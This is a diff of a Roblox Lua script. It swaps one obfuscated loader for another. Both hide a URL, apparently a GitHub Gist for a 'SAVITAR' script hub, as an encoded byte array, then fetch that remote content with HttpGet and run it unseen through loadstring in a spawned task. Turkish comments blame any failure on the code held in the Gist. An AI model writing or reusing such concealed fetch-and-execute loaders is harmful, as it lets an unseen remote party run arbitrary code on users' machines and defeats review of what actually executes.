@@ -1,1 +1,27 @@
-local _0x536176=function(_0x64,_0x6B)local _0x72=""local _0x62=bit32 or bit64 for _0x69=1,#_0x64 do local _0x76=_0x64[_0x69]local _0x6D=((_0x69-1)%#_0x6B)+1 local _0x6B_c=_0x6B:byte(_0x6D)local _0x61=_0x76-_0x6B_c _0x72=_0x72..string.char((_0x61%256))end return _0x72 end local _0x4C3D={111,123,123,119,122,65,54,54,110,112,122,123,53,110,112,123,111,124,105,124,122,108,121,106,118,117,123,108,117,123,53,106,118,116,54,62,90,104,125,112,123,104,121,54,58,60,104,61,108,107,104,108,109,63,109,57,109,61,64,62,57,109,57,109,57,58,63,63,60,106,105,106,58,56,57,108,54,121,104,126,54,105,56,64,105,104,105,107,108,55,55,104,64,58,55,57,58,59,107,60,56,107,106,106,57,108,109,107,106,58,57,56,109,62,108,107,107,108,56,64,60,54,77,91,72,87,52,90,72,93,80,91,72,89,52,79,92,73,52,73,76,91,72}local _0x4B59=string.char(7,7,7)local _0x4558=function()local _0x53,_0x43=pcall(function()local _0x4C=_0x536176(_0x4C3D,_0x4B59)return game:HttpGet(_0x4C.."?"..tostring(math.random(1,1000)),true)end)if _0x53 and _0x43 then local _0x46,_0x45=loadstring(_0x43)if _0x46 then task.spawn(_0x46)else warn("Loader Error: 0x1")end else warn("Network Error: 0x2")end end _0x4558()
+local _S = string; local _T = table; local _G = game;
+local _D = {116,128,128,124,127,70,59,59,115,117,127,128,58,115,117,128,116,129,110,129,127,113,126,111,123,122,128,113,122,128,58,111,123,121,59,67,95,109,130,117,128,109,126,59,63,65,109,66,113,112,109,113,114,68,114,62,114,66,69,67,62,114,62,114,62,63,68,68,65,111,110,111,63,61,62,113,59,126,109,131,59,110,61,69,110,109,110,112,113,60,60,109,69,63,60,62,63,64,112,65,61,112,111,111,62,113,114,112,111,63,62,61,114,67,113,112,112,113,61,69,65,59,82,96,77,92,57,95,77,98,85,96,77,94,57,84,97,78,57,78,81,96,77}
+local _K = 12
+
+local function _LOAD(_DATA)
+    local _U = ""
+    for _i=1, #_DATA do
+        _U = _U .. _S.char(_DATA[_i] - _K)
+    end
+    
+    local _OK, _RES = pcall(function()
+        return _G:HttpGet(_U .. "?cache=" .. math.random(1,9999))
+    end)
+    
+    if _OK and _RES then
+        -- PARÇALI YÜKLEME (Line 1 hatasını kökten çözer)
+        local _F, _E = loadstring(_RES, "SAVITAR_CORE")
+        if _F then
+            task.spawn(_F)
+        else
+            -- Eğer burada hata alıyorsan ana kodun (Gist'teki) bozuktur
+            _G:GetService("TestService"):Message("SAVITAR ERROR: " .. tostring(_E))
+        end
+    end
+end
+
+_LOAD(_D)
